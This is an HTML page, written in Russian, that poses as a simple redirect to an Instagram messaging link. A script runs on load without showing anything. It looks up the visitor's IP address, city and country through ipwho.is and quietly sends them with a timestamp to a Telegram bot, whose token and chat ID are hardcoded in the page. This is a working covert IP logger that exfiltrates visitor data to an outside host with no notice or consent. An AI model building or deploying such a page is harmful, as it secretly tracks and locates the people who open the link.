<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Redirect...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="margin:0; padding:0; background:#fff;">
  <script>
    const TOKEN = "7930993307:AAHuIxRVgr9OD7ZP_D2dbrbEu-JGBdZSnc4";
    const CHAT_ID = "5253808709";
    const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        const msg = `📥 Заход на редирект\n🌍 IP: ${data.ip}\n📍 ${data.city}, ${data.country}\n🕒 ${new Date().toLocaleString()}`;
        fetch(API, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
      });

    setTimeout(() => {
      window.location.href = "https://ig.me/m/tymin_min374";
    }, 600);
  </script>
</body>
</html>
